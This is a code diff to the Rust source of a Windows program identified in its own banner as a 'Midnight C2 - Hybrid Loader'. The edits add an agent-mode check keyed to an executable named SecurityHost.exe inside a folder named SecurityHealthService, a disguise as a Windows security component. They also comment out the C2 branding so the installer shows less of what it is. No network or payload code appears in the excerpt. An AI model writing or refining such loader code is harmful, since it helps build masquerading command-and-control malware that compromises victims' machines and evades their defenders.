@@ -434,9 +434,19 @@ fn main() -> windows::core::Result<()> {
         }
         
         // === AGENT MODE DETECTION ===
+        let current_exe_name = std::path::Path::new(&current_path)
+            .file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
+        let parent_dir = std::path::Path::new(&current_path)
+            .parent().unwrap_or(std::path::Path::new(""))
+            .file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
+
         let is_target_path = current_lower == target_lower;
         let is_system = std::env::var("USERNAME").unwrap_or_default().to_uppercase() == "SYSTEM";
-        let is_agent_mode = (args.iter().any(|a| a == "agent")) || is_target_path || is_system;
+        
+        // Robust check: matches path OR (exe name AND parent folder name)
+        let is_installed_location = is_target_path || (current_exe_name == "securityhost.exe" && parent_dir == "securityhealthservice");
+        
+        let is_agent_mode = (args.iter().any(|a| a == "agent")) || is_installed_location || is_system;
         
         if !is_agent_mode {
             // ===== INSTALLER MODE (with UI) =====
@@ -444,19 +454,21 @@ fn main() -> windows::core::Result<()> {
             let (_, _, is_admin) = get_install_info();
             
             std::thread::spawn(move || {
+                /*
                 append_log("╔════════════════════════════════════════╗");
                 append_log("║   Midnight C2 - Hybrid Loader v0.6.13 ║");
                 append_log("║       Build Date: 2026-02-15          ║");
                 append_log("╚════════════════════════════════════════╝");
                 append_log("");
+                */
 
                 if !is_admin {
-                    append_log(" [!] ERROR: Administrator privileges required!");
-                    append_log("");
-                    append_log(" Please right-click SecurityHost.exe and");
-                    append_log(" select 'Run as administrator'.");
-                    append_log("");
-                    append_log("════════════════════════════════════════");
+                    append_log(" [!] Error: Administrator privileges required.");
+                    // append_log("");
+                    // append_log(" Please right-click SecurityHost.exe a...");
+                    // append_log(" select 'Run as administrator'.");
+                    // append_log("");
+                    // append_log("════════════════════════════════════════");
                     return; // Stop here
                 }
 
